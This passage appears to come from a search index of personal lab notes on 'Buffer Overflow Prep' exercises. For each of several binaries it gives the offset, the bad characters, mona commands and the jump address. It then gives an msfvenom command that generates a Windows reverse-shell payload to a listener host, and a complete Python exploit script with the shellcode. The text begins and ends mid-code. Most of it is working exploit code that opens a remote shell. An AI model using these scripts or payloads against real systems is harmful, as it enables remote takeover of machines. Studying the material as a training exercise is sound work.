xaa\\xa6\\x7f\\x3d\\x43\\x5e\\xda\\xb5\\xf2\\x9f\\xf0\\xb0\\x35\\x2b\"\n\"\\xf7\\x45\\xfb\\xdc\\x72\\x55\\x6c\\x2d\\xc9\\x07\\x3b\\x32\\xe7\\x2f\\xa7\"\n\"\\xa1\\x6c\\xaf\\xae\\xd9\\x3a\\xf8\\xe7\\x2c\\x33\\x6c\\x1a\\x16\\xed\\x92\"\n\"\\xe7\\xce\\xd6\\x16\\x3c\\x33\\xd8\\x97\\xb1\\x0f\\xfe\\x87\\x0f\\x8f\\xba\"\n\"\\xf3\\xdf\\xc6\\x14\\xad\\x99\\xb0\\xd6\\x07\\x70\\x6e\\xb1\\xcf\\x05\\x5c\"\n\"\\x02\\x89\\x09\\x89\\xf4\\x75\\xbb\\x64\\x41\\x8a\\x74\\xe1\\x45\\xf3\\x68\"\n\"\\x91\\xaa\\x2e\\x29\\xb1\\x48\\xfa\\x44\\x5a\\xd5\\x6f\\xe5\\x07\\xe6\\x5a\"\n\"\\x2a\\x3e\\x65\\x6e\\xd3\\xc5\\x75\\x1b\\xd6\\x82\\x31\\xf0\\xaa\\x9b\\xd7\"\n\"\\xf6\\x19\\x9b\\xfd\\xf6\\x9d\\x63\\xfe\"\n)\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload  + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-4/","title":"Binary 4","text":"<p>con## fuzzing</p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-4/#offset","title":"offset","text":"<p>EIP: 70433570</p> <p></p> <p>offset: 2026 </p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-4/#bad-chars","title":"bad chars","text":"<p><code>!mona config -set workingfolder c:\\mona\\%p</code></p> <p><code>!mona bytearray -b \"\\x00\"</code></p> <p>ESP: 018BFA30</p> <p></p> <p><code>!mona compare -f C:\\mona\\oscp\\bytearray.bin -a 018BFA30</code></p> <p>bad chars: <code>\\x00\\xa9\\xcd\\xd4</code></p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-4/#jmp-point","title":"jmp point","text":"<p><code>!mona jmp -r esp -cpb \"\\x00\\xa9\\xcd\\xd4\"</code></p> <p><code>625011AF</code></p> <p>little endian: <code>\\xaf\\x11\\x50\\x62</code></p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-4/#exploit","title":"exploit","text":"<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\\xa9\\xcd\\xd4\"</code></p> <p></p> <pre><code>import socket\n\nip = \"10.10.171.241\"\nport = 1337\n\nprefix = \"OVERFLOW4 \"\noffset = 2026\noverflow = \"A\" * offset\nretn = \"\\xaf\\x11\\x50\\x62\"\npadding = \"\\x90\" * 16\npayload = (\n\"\\xda\\xdc\\xd9\\x74\\x24\\xf4\\x5f\\xb8\\xfe\\x81\\xd3\\xfa\\x33\\xc9\\xb1\"\n\"\\x52\\x83\\xef\\xfc\\x31\\x47\\x13\\x03\\xb9\\x92\\x31\\x0f\\xb9\\x7d\\x37\"\n\"\\xf0\\x41\\x7e\\x58\\x78\\xa4\\x4f\\x58\\x1e\\xad\\xe0\\x68\\x54\\xe3\\x0c\"\n\"\\x02\\x38\\x17\\x86\\x66\\x95\\x18\\x2f\\xcc\\xc3\\x17\\xb0\\x7d\\x37\\x36\"\n\"\\x32\\x7c\\x64\\x98\\x0b\\x4f\\x79\\xd9\\x4c\\xb2\\x70\\x8b\\x05\\xb8\\x27\"\n\"\\x3b\\x21\\xf4\\xfb\\xb0\\x79\\x18\\x7c\\x25\\xc9\\x1b\\xad\\xf8\\x41\\x42\"\n\"\\x6d\\xfb\\x86\\xfe\\x24\\xe3\\xcb\\x3b\\xfe\\x98\\x38\\xb7\\x01\\x48\\x71\"\n\"\\x38\\xad\\xb5\\xbd\\xcb\\xaf\\xf2\\x7a\\x34\\xda\\x0a\\x79\\xc9\\xdd\\xc9\"\n\"\\x03\\x15\\x6b\\xc9\\xa4\\xde\\xcb\\x35\\x54\\x32\\x8d\\xbe\\x5a\\xff\\xd9\"\n\"\\x98\\x7e\\xfe\\x0e\\x93\\x7b\\x8b\\xb0\\x73\\x0a\\xcf\\x96\\x57\\x56\\x8b\"\n\"\\xb7\\xce\\x32\\x7a\\xc7\\x10\\x9d\\x23\\x6d\\x5b\\x30\\x37\\x1c\\x06\\x5d\"\n\"\\xf4\\x2d\\xb8\\x9d\\x92\\x26\\xcb\\xaf\\x3d\\x9d\\x43\\x9c\\xb6\\x3b\\x94\"\n\"\\xe3\\xec\\xfc\\x0a\\x1a\\x0f\\xfd\\x03\\xd9\\x5b\\xad\\x3b\\xc8\\xe3\\x26\"\n\"\\xbb\\xf5\\x31\\xe8\\xeb\\x59\\xea\\x49\\x5b\\x1a\\x5a\\x22\\xb1\\x95\\x85\"\n\"\\x52\\xba\\x7f\\xae\\xf9\\x41\\xe8\\xdb\\xec\\x4d\\x38\\xb3\\x0c\\x4d\\x9b\"\n\"\\x6d\\x98\\xab\\xb1\\x7d\\xcc\\x64\\x2e\\xe7\\x55\\xfe\\xcf\\xe8\\x43\\x7b\"\n\"\\xcf\\x63\\x60\\x7c\\x9e\\x83\\x0d\\x6e\\x77\\x64\\x58\\xcc\\xde\\x7b\\x76\"\n\"\\x78\\xbc\\xee\\x1d\\x78\\xcb\\x12\\x8a\\x2f\\x9c\\xe5\\xc3\\xa5\\x30\\x5f\"\n\"\\x7a\\xdb\\xc8\\x39\\x45\\x5f\\x17\\xfa\\x48\\x5e\\xda\\x46\\x6f\\x70\\x22\"\n\"\\x46\\x2b\\x24\\xfa\\x11\\xe5\\x92\\xbc\\xcb\\x47\\x4c\\x17\\xa7\\x01\\x18\"\n\"\\xee\\x8b\\x91\\x5e\\xef\\xc1\\x67\\xbe\\x5e\\xbc\\x31\\xc1\\x6f\\x28\\xb6\"\n\"\\xba\\x8d\\xc8\\x39\\x11\\x16\\xe8\\xdb\\xb3\\x63\\x81\\x45\\x56\\xce\\xcc\"\n\"\\x75\\x8d\\x0d\\xe9\\xf5\\x27\\xee\\x0e\\xe5\\x42\\xeb\\x4b\\xa1\\xbf\\x81\"\n\"\\xc4\\x44\\xbf\\x36\\xe4\\x4c\"\n)\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload  + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-5/","title":"Binary 5","text":""},{"location":"Buffer%20Overflow%20Prep/binary-5/#fuzzing","title":"fuzzing","text":""},{"location":"Buffer%20Overflow%20Prep/binary-5/#offset","title":"offset","text":"<p>EIP: 356B4134</p> <p>offset: 314</p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-5/#bad-chars","title":"bad chars","text":"<p>bad chars: <code>\\x00\\x16\\x2f\\xf4\\xfd</code> </p>"},{"location":"Buffer%20Overflow%20Prep/binary-5/#jmp-point","title":"jmp point","text":"<p><code>!mona jmp -r esp -cpb \"\\x00\\x16\\x2f\\xf4\\xfd\"</code></p> <p><code>625011AF</code></p> <p>little endian: <code>\\xaf\\x11\\x50\\x62</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-5/#exploit","title":"exploit","text":"<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\\x16\\x2f\\xf4\\xfd\"</code></p> <p></p> <pre><code>import socket\n\nip = \"10.10.171.241\"\nport = 1337\n\nprefix = \"OVERFLOW5 \"\noffset = 314\noverflow = \"A\" * offset\nretn = \"\\xaf\\x11\\x50\\x62\"\npadding = \"\\x90\" * 16\npayload = (\n\"\\xfc\\xbb\\x3e\\xf0\\xc7\\x38\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3\"\n\"\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\xc2\\x18\\x45\\x38\\x3a\"\n\"\\xd9\\x2a\\xb0\\xdf\\xe8\\x6a\\xa6\\x94\\x5b\\x5b\\xac\\xf8\\x57\\x10\\xe0\"\n\"\\xe8\\xec\\x54\\x2d\\x1f\\x44\\xd2\\x0b\\x2e\\x55\\x4f\\x6f\\x31\\xd5\\x92\"\n\"\\xbc\\x91\\xe4\\x5c\\xb1\\xd0\\x21\\x80\\x38\\x80\\xfa\\xce\\xef\\x34\\x8e\"\n\"\\x9b\\x33\\xbf\\xdc\\x0a\\x34\\x5c\\x94\\x2d\\x15\\xf3\\xae\\x77\\xb5\\xf2\"\n\"\\x63\\x0c\\xfc\\xec\\x60\\x29\\xb6\\x87\\x53\\xc5\\x49\\x41\\xaa\\x26\\xe5\"\n\"\\xac\\x02\\xd5\\xf7\\xe9\\xa5\\x06\\x82\\x03\\xd6\\xbb\\x95\\xd0\\xa4\\x67\"\n\"\\x13\\xc2\\x0f\\xe3\\x83\\x2e\\xb1\\x20\\x55\\xa5\\xbd\\x8d\\x11\\xe1\\xa1\"\n\"\\x10\\xf5\\x9a\\xde\\x99\\xf8\\x4c\\x57\\xd9\\xde\\x48\\x33\\xb9\\x7f\\xc9\"\n\"\\x99\\x6c\\x7f\\x09\\x42\\xd0\\x25\\x42\\x6f\\x05\\x54\\x09\\xf8\\xea\\x55\"\n\"\\xb1\\xf8\\x64\\xed\\xc2\\xca\\x2b\\x45\\x4c\\x67\\xa3\\x43\\x8b\\x88\\x9e\"\n\"\\x34\\x03\\x77\\x21\\x45\\x0a\\xbc\\x75\\x15\\x24\\x15\\xf6\\xfe\\xb4\\x9a\"\n\"\\x23\\x50\\xe4\\x34\\x9c\\x11\\x54\\xf5\\x4c\\xfa\\xbe\\xfa\\xb3\\x1a\\xc1\"\n\"\\xd0\\xdb\\xb1\\x38\\xb3\\xe9\\x54\\x46\\x93\\x86\\x54\\x46\\x30\\x7e\\xd0\"\n\"\\xa0\\x5c\\x90\\xb4\\x7b\\xc9\\x09\\x9d\\xf7\\x68\\xd5\\x0b\\x72\\xaa\\x5d\"\n\"\\xb8\\x83\\x65\\x96\\xb5\\x97\\x12\\x56\\x80\\xc5\\xb5\\x69\\x3e\\x61\\x59\"\n\"\\xfb\\xa5\\x71\\x14\\xe0\\x71\\x26\\x71\\xd6\\x8b\\xa2\\x6f\\x41\\x22\\xd0\"\n\"\\x6d\\x17\\x0d\\x50\\xaa\\xe4\\x90\\x59\\x3f\\x50\\xb7\\x49\\xf9\\x59\\xf3\"\n\"\\x3d\\x55\\x0c\\xad\\xeb\\x13\\xe6\\x1f\\x45\\xca\\x55\\xf6\\x01\\x8b\\x95\"\n\"\\xc9\\x57\\x94\\xf3\\xbf\\xb7\\x25\\xaa\\xf9\\xc8\\x8a\\x3a\\x0e\\xb1\\xf6\"\n\"\\xda\\xf1\\x68\\xb3\\xfb\\x13\\xb8\\xce\\x93\\x8d\\x29\\x73\\xfe\\x2d\\x84\"\n\"\\xb0\\x07\\xae\\x2c\\x49\\xfc\\xae\\x45\\x4c\\xb8\\x68\\xb6\\x3c\\xd1\\x1c\"\n\"\\xb8\\x93\\xd2\\x34\\xb8\\x13\\x2d\\xb7\"\n)\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload  + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-6/","title":"Binary 6","text":""},{"location":"Buffer%20Overflow%20Prep/binary-6/#fuzzing","title":"fuzzing","text":""},{"location":"Buffer%20Overflow%20Prep/binary-6/#offset","title":"offset","text":"<p>EIP: 35694234</p> <p>offset: 1034</p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-6/#bad-chars","title":"bad chars","text":"<p>ESP: 0185FA30</p> <p></p> <p>bad chars: <code>\\x00\\x08\\x2c\\xad</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-6/#jmp-point","title":"jmp point","text":"<p><code>!mona jmp -r esp -cpb \"\\x00\\x08\\x2c\\xad\"</code></p> <p></p> <p>625011AF little endian: <code>\\xaf\\x11\\x50\\x62</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-6/#exploit","title":"exploit","text":"<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\\x08\\x2c\\xad\"</code></p> <p></p> <pre><code>import socket\n\nip = \"10.10.171.241\"\nport = 1337\n\nprefix = \"OVERFLOW6 \"\noffset = 1034\noverflow = \"A\" * offset\nretn = \"\\xaf\\x11\\x50\\x62\"\npadding = \"\\x90\" * 16\npayload = (\n\"\\xda\\xcd\\xd9\\x74\\x24\\xf4\\xbb\\xb3\\xe7\\x09\\x1b\\x5a\\x29\\xc9\\xb1\"\n\"\\x52\\x83\\xea\\xfc\\x31\\x5a\\x13\\x03\\xe9\\xf4\\xeb\\xee\\xf1\\x13\\x69\"\n\"\\x10\\x09\\xe4\\x0e\\x98\\xec\\xd5\\x0e\\xfe\\x65\\x45\\xbf\\x74\\x2b\\x6a\"\n\"\\x34\\xd8\\xdf\\xf9\\x38\\xf5\\xd0\\x4a\\xf6\\x23\\xdf\\x4b\\xab\\x10\\x7e\"\n\"\\xc8\\xb6\\x44\\xa0\\xf1\\x78\\x99\\xa1\\x36\\x64\\x50\\xf3\\xef\\xe2\\xc7\"\n\"\\xe3\\x84\\xbf\\xdb\\x88\\xd7\\x2e\\x5c\\x6d\\xaf\\x51\\x4d\\x20\\xbb\\x0b\"\n\"\\x4d\\xc3\\x68\\x20\\xc4\\xdb\\x6d\\x0d\\x9e\\x50\\x45\\xf9\\x21\\xb0\\x97\"\n\"\\x02\\x8d\\xfd\\x17\\xf1\\xcf\\x3a\\x9f\\xea\\xa5\\x32\\xe3\\x97\\xbd\\x81\"\n\"\\x99\\x43\\x4b\\x11\\x39\\x07\\xeb\\xfd\\xbb\\xc4\\x6a\\x76\\xb7\\xa1\\xf9\"\n\"\\xd0\\xd4\\x34\\x2d\\x6b\\xe0\\xbd\\xd0\\xbb\\x60\\x85\\xf6\\x1f\\x28\\x5d\"\n\"\\x96\\x06\\x94\\x30\\xa7\\x58\\x77\\xec\\x0d\\x13\\x9a\\xf9\\x3f\\x7e\\xf3\"\n\"\\xce\\x0d\\x80\\x03\\x59\\x05\\xf3\\x31\\xc6\\xbd\\x9b\\x79\\x8f\\x1b\\x5c\"\n\"\\x7d\\xba\\xdc\\xf2\\x80\\x45\\x1d\\xdb\\x46\\x11\\x4d\\x73\\x6e\\x1a\\x06\"\n\"\\x83\\x8f\\xcf\\x89\\xd3\\x3f\\xa0\\x69\\x83\\xff\\x10\\x02\\xc9\\x0f\\x4e\"\n\"\\x32\\xf2\\xc5\\xe7\\xd9\\x09\\x8e\\x0d\\x0f\\x15\\x9e\\x7a\\x2d\\x15\\x3d\"\n\"\\x52\\xb8\\xf3\\x2b\\xb4\\xec\\xac\\xc3\\x2d\\xb5\\x26\\x75\\xb1\\x63\\x43\"\n\"\\xb5\\x39\\x80\\xb4\\x78\\xca\\xed\\xa6\\xed\\x3a\\xb8\\x94\\xb8\\x45\\x16\"\n\"\\xb0\\x27\\xd7\\xfd\\x40\\x21\\xc4\\xa9\\x17\\x66\\x3a\\xa0\\xfd\\x9a\\x65\"\n\"\\x1a\\xe3\\x66\\xf3\\x65\\xa7\\xbc\\xc0\\x68\\x26\\x30\\x7c\\x4f\\x38\\x8c\"\n\"\\x7d\\xcb\\x6c\\x40\\x28\\x85\\xda\\x26\\x82\\x67\\xb4\\xf0\\x79\\x2e\\x50\"\n\"\\x84\\xb1\\xf1\\x26\\x89\\x9f\\x87\\xc6\\x38\\x76\\xde\\xf9\\xf5\\x1e\\xd6\"\n\"\\x82\\xeb\\xbe\\x19\\x59\\xa8\\xdf\\xfb\\x4b\\xc5\\x77\\xa2\\x1e\\x64\\x1a\"\n\"\\x55\\xf5\\xab\\x23\\xd6\\xff\\x53\\xd0\\xc6\\x8a\\x56\\x9c\\x40\\x67\\x2b\"\n\"\\x8d\\x24\\x87\\x98\\xae\\x6c\"\n)\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload  + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-7/","title":"Binary 7","text":""},{"location":"Buffer%20Overflow%20Prep/binary-7/#fuzzing","title":"fuzzing","text":""},{"location":"Buffer%20Overflow%20Prep/binary-7/#offset","title":"offset","text":"<p>EIP: 72423572</p> <p>offset: 1306</p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-7/#bad-chars","title":"bad chars","text":"<p>ESP: 0188FA30</p> <p>bardchars: <code>\\x00\\x8c\\xae\\xbe\\xfb</code></p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-7/#jmp-point","title":"jmp point","text":"<p>625011AF</p> <p>little endian: <code>\\xaf\\x11\\x50\\x62</code></p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-7/#exploit","title":"exploit","text":"<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\\x8c\\xae\\xbe\\xfb\"</code></p> <p></p> <pre><code>import socket\n\nip = \"10.10.171.241\"\nport = 1337\n\nprefix = \"OVERFLOW7 \"\noffset = 1306\noverflow = \"A\" * offset\nretn = \"\\xaf\\x11\\x50\\x62\"\npadding = \"\\x90\" * 16\npayload = (\n\"\\x29\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\\x76\\x0e\"\n\"\\x3f\\x16\\x21\\x60\\x83\\xee\\xfc\\xe2\\xf4\\xc3\\xfe\\xa3\\x60\\x3f\\x16\"\n\"\\x41\\xe9\\xda\\x27\\xe1\\x04\\xb4\\x46\\x11\\xeb\\x6d\\x1a\\xaa\\x32\\x2b\"\n\"\\x9d\\x53\\x48\\x30\\xa1\\x6b\\x46\\x0e\\xe9\\x8d\\x5c\\x5e\\x6a\\x23\\x4c\"\n\"\\x1f\\xd7\\xee\\x6d\\x3e\\xd1\\xc3\\x92\\x6d\\x41\\xaa\\x32\\x2f\\x9d\\x6b\"\n\"\\x5c\\xb4\\x5a\\x30\\x18\\xdc\\x5e\\x20\\xb1\\x6e\\x9d\\x78\\x40\\x3e\\xc5\"\n\"\\xaa\\x29\\x27\\xf5\\x1b\\x29\\xb4\\x22\\xaa\\x61\\xe9\\x27\\xde\\xcc\\xfe\"\n\"\\xd9\\x2c\\x61\\xf8\\x2e\\xc1\\x15\\xc9\\x15\\x5c\\x98\\x04\\x6b\\x05\\x15\"\n\"\\xdb\\x4e\\xaa\\x38\\x1b\\x17\\xf2\\x06\\xb4\\x1a\\x6a\\xeb\\x67\\x0a\\x20\"\n\"\\xb3\\xb4\\x12\\xaa\\x61\\xef\\x9f\\x65\\x44\\x1b\\x4d\\x7a\\x01\\x66\\x4c\"\n\"\\x70\\x9f\\xdf\\x49\\x7e\\x3a\\xb4\\x04\\xca\\xed\\x62\\x7e\\x12\\x52\\x3f\"\n\"\\x16\\x49\\x17\\x4c\\x24\\x7e\\x34\\x57\\x5a\\x56\\x46\\x38\\xe9\\xf4\\xd8\"\n\"\\xaf\\x17\\x21\\x60\\x16\\xd2\\x75\\x30\\x57\\x3f\\xa1\\x0b\\x3f\\xe9\\xf4\"\n\"\\x30\\x6f\\x46\\x71\\x20\\x6f\\x56\\x71\\x08\\xd5\\x19\\xfe\\x80\\xc0\\xc3\"\n\"\\xb6\\x0a\\x3a\\x7e\\x2b\\x71\\x3b\\xc6\\x49\\x62\\x3f\\x35\\x08\\xe9\\xd9\"\n\"\\x7c\\x31\\x36\\x68\\x7e\\xb8\\xc5\\x4b\\x77\\xde\\xb5\\xba\\xd6\\x55\\x6c\"\n\"\\xc0\\x58\\x29\\x15\\xd3\\x7e\\xd1\\xd5\\x9d\\x40\\xde\\xb5\\x57\\x75\\x4c\"\n\"\\x04\\x3f\\x9f\\xc2\\x37\\x68\\x41\\x10\\x96\\x55\\x04\\x78\\x36\\xdd\\xeb\"\n\"\\x47\\xa7\\x7b\\x32\\x1d\\x61\\x3e\\x9b\\x65\\x44\\x2f\\xd0\\x21\\x24\\x6b\"\n\"\\x46\\x77\\x36\\x69\\x50\\x77\\x2e\\x69\\x40\\x72\\x36\\x57\\x6f\\xed\\x5f\"\n\"\\xb9\\xe9\\xf4\\xe9\\xdf\\x58\\x77\\x26\\xc0\\x26\\x49\\x68\\xb8\\x0b\\x41\"\n\"\\x9f\\xea\\xad\\xc1\\x7d\\x15\\x1c\\x49\\xc6\\xaa\\xab\\xbc\\x9f\\xea\\x2a\"\n\"\\x27\\x1c\\x35\\x96\\xda\\x80\\x4a\\x13\\x9a\\x27\\x2c\\x64\\x4e\\x0a\\x3f\"\n\"\\x45\\xde\\xb5\"\n)\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload  + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-8/","title":"Binary 8","text":""},{"location":"Buffer%20Overflow%20Prep/binary-8/#fuzzing","title":"fuzzing","text":""},{"location":"Buffer%20Overflow%20Prep/binary-8/#offset","title":"offset","text":"<p>EIP: 68433568</p> <p>offset: 1786</p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-8/#bad-chars","title":"bad chars","text":"<p>ESP: 01A0FA30</p> <p>bad chars: <code>\\x00\\x1d\\x2e\\xc7\\xee</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-8/#jmp-point","title":"jmp point","text":"<p><code>!mona jmp -r esp -cpb \"\\x00\\x1d\\x2e\\xc7\\xee\"</code></p> <p></p> <p><code>625011AF</code></p> <p>little endian: <code>\\xaf\\x11\\x50\\x62</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-8/#exploit","title":"exploit","text":"<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\\x1d\\x2e\\xc7\\xee\"</code></p> <p></p> <pre><code>import socket\n\nip = \"10.10.171.241\"\nport = 1337\n\nprefix = \"OVERFLOW8 \"\noffset = 1786\noverflow = \"A\" * offset\nretn = \"\\xaf\\x11\\x50\\x62\"\npadding = \"\\x90\" * 16\npayload = (\n\"\\xdb\\xc2\\xd9\\x74\\x24\\xf4\\xba\\x80\\xd6\\x0e\\x14\\x5b\\x29\\xc9\\xb1\"\n\"\\x52\\x31\\x53\\x17\\x03\\x53\\x17\\x83\\x43\\xd2\\xec\\xe1\\xbf\\x33\\x72\"\n\"\\x09\\x3f\\xc4\\x13\\x83\\xda\\xf5\\x13\\xf7\\xaf\\xa6\\xa3\\x73\\xfd\\x4a\"\n\"\\x4f\\xd1\\x15\\xd8\\x3d\\xfe\\x1a\\x69\\x8b\\xd8\\x15\\x6a\\xa0\\x19\\x34\"\n\"\\xe8\\xbb\\x4d\\x96\\xd1\\x73\\x80\\xd7\\x16\\x69\\x69\\x85\\xcf\\xe5\\xdc\"\n\"\\x39\\x7b\\xb3\\xdc\\xb2\\x37\\x55\\x65\\x27\\x8f\\x54\\x44\\xf6\\x9b\\x0e\"\n\"\\x46\\xf9\\x48\\x3b\\xcf\\xe1\\x8d\\x06\\x99\\x9a\\x66\\xfc\\x18\\x4a\\xb7\"\n\"\\xfd\\xb7\\xb3\\x77\\x0c\\xc9\\xf4\\xb0\\xef\\xbc\\x0c\\xc3\\x92\\xc6\\xcb\"\n\"\\xb9\\x48\\x42\\xcf\\x1a\\x1a\\xf4\\x2b\\x9a\\xcf\\x63\\xb8\\x90\\xa4\\xe0\"\n\"\\xe6\\xb4\\x3b\\x24\\x9d\\xc1\\xb0\\xcb\\x71\\x40\\x82\\xef\\x55\\x08\\x50\"\n\"\\x91\\xcc\\xf4\\x37\\xae\\x0e\\x57\\xe7\\x0a\\x45\\x7a\\xfc\\x26\\x04\\x13\"\n\"\\x31\\x0b\\xb6\\xe3\\x5d\\x1c\\xc5\\xd1\\xc2\\xb6\\x41\\x5a\\x8a\\x10\\x96\"\n\"\\x9d\\xa1\\xe5\\x08\\x60\\x4a\\x16\\x01\\xa7\\x1e\\x46\\x39\\x0e\\x1f\\x0d\"\n\"\\xb9\\xaf\\xca\\x82\\xe9\\x1f\\xa5\\x62\\x59\\xe0\\x15\\x0b\\xb3\\xef\\x4a\"\n\"\\x2b\\xbc\\x25\\xe3\\xc6\\x47\\xae\\x06\\x06\\x43\\xfe\\x7f\\x2a\\x4b\\xdd\"\n\"\\x56\\xa3\\xad\\x4b\\xb9\\xe5\\x66\\xe4\\x20\\xac\\xfc\\x95\\xad\\x7a\\x79\"\n\"\\x95\\x26\\x89\\x7e\\x58\\xcf\\xe4\\x6c\\x0d\\x3f\\xb3\\xce\\x98\\x40\\x69\"\n\"\\x66\\x46\\xd2\\xf6\\x76\\x01\\xcf\\xa0\\x21\\x46\\x21\\xb9\\xa7\\x7a\\x18\"\n\"\\x13\\xd5\\x86\\xfc\\x5c\\x5d\\x5d\\x3d\\x62\\x5c\\x10\\x79\\x40\\x4e\\xec\"\n\"\\x82\\xcc\\x3a\\xa0\\xd4\\x9a\\x94\\x06\\x8f\\x6c\\x4e\\xd1\\x7c\\x27\\x06\"\n\"\\xa4\\x4e\\xf8\\x50\\xa9\\x9a\\x8e\\xbc\\x18\\x73\\xd7\\xc3\\x95\\x13\\xdf\"\n\"\\xbc\\xcb\\x83\\x20\\x17\\x48\\xa3\\xc2\\xbd\\xa5\\x4c\\x5b\\x54\\x04\\x11\"\n\"\\x5c\\x83\\x4b\\x2c\\xdf\\x21\\x34\\xcb\\xff\\x40\\x31\\x97\\x47\\xb9\\x4b\"\n\"\\x88\\x2d\\xbd\\xf8\\xa9\\x67\"\n)\n\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload  + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print(\"Sending evil buffer...\")\n  s.send(bytes(buffer + \"\\r\\n\", \"latin-1\"))\n  print(\"Done!\")\nexcept:\n  print(\"Could not connect.\")\n</code></pre>"},{"location":"Buffer%20Overflow%20Prep/binary-9/","title":"Binary 9","text":""},{"location":"Buffer%20Overflow%20Prep/binary-9/#fuzzing","title":"fuzzing","text":""},{"location":"Buffer%20Overflow%20Prep/binary-9/#offset","title":"offset","text":"<p>EIP: 35794234</p> <p>offset: 1514</p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-9/#bad-chars","title":"bad chars","text":"<p>ESP: 017FFA30</p> <p>bad chars:  <code>\\x00\\x04\\x3e\\xe1</code></p> <p></p>"},{"location":"Buffer%20Overflow%20Prep/binary-9/#jmp-point","title":"jmp point","text":"<p><code>625011AF</code></p> <p>little endian:  <code>\\xaf\\x11\\x50\\x62</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-9/#exploit","title":"exploit","text":"<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\\x04\\x3e\\xe1\"</code></p> <p>here the rev connection is made but no shell so it might be due to a char which is hidden due to the preceding one.</p> <p>re-checking </p>"},{"location":"Buffer%20Overflow%20Prep/binary-9/#bad-char-re-check","title":"bad char - re check","text":"<p>remove the bad chars from our list (python script) and create a new byte array <code>!mona bytearray -b \"\\x00\\x04\\x3e\\xe1\"</code></p> <p></p> <p>ESP:  019EFA30</p> <p>and checking we got another bad char </p> <p></p> <p>bad chars: <code>\\x00\\x04\\x3e\\x3f\\xe1</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-9/#jmp-re","title":"jmp - re","text":"<p><code>625011AF</code></p> <p>little endian:  <code>\\xaf\\x11\\x50\\x62</code></p>"},{"location":"Buffer%20Overflow%20Prep/binary-9/#exploit-re","title":"exploit - re","text":"<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\\x04\\x3e\\x3f\\xe1\"</code></p> <p>and this time we successfully got the proper shell</p> <p></p> <pre><code>import socket\n\nip = \"10.10.171.241\"\nport = 1337\n\nprefix = \"OVERFLOW9 \"\noffset = 1514\noverflow = \"A\" * offset\nretn = 